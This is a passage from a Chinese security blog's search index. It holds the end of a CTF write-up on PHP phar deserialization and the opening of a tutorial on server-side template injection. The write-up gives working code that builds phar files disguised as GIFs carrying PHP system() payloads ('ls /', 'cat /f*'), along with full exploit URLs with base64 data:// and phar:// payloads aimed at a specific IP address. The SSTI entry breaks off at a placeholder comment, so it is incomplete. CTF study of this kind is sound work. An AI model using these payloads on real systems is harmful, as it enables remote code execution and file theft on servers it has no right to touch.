class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&amp;tp=tp1</a></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;2d867d52da656654f238ad3f2eceda1d.html</p><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&amp;tp=tp1</a></p><p><img src="/.com//1747658344956718479055138235582-20250519203906-jvepfqt.png" alt="1747658344956718479055138235582"></p><p><strong>测试根目录</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&amp;tp=tp1</a></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;ed5cb36b19cdb7f89f98caaa83efda37.html</p><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&amp;tp=tp1</a></p><p><img src="/.com//17476583692577796986138384772586-20250519203930-ih4wpf3.png" alt="17476583692577796986138384772586"></p><p><strong>获取flag</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&amp;tp=tp1</a></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;50d6dc5cc571407544cd2bff51338b7e.html</p><p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&amp;tp=tp1</a></p><p>步骤是对的可能没有写flag嘿嘿 到此结束！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
      <tag>CTF题目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI前篇</title>
    <link href="/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/"/>
    <url>/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/</url>
    
    <content type="html"><![CDATA[## 前言 模板引擎模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。## **1**|**2SSTI（模板注入）**SSTI 就是服务器端模板注入（Server-Side Template Injection）当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。## **1**|**3附表**![image](assets/image-20250425223010-i7n3kwr.png)# **2**|**0Php中的SSTI**php常见的模板：twig，smarty，blade## **2**|**1Twig**Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;<br>　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);<br>　　<span class="hljs-variable">$twig</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Environment</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Loader_String</span>());<br>&#123;% raw %&#125;<br>　　<span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>]));  <span class="hljs-comment">// 将用户输入作为模版变量的值</span><br>&#123;% endraw %&#125;<br>　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>// ... 剩余完整文件内容，确保所有模板示例代码都包裹在{% raw %}{% endraw %}标签中 ... <h1 id="6-0参考链接"><a href="#6-0参考链接" class="headerlink" title="6|0参考链接"></a><strong>6</strong>|<strong>0参考链接</strong></h1>{% raw %}{% endraw %} ]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
      <tag>模板注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
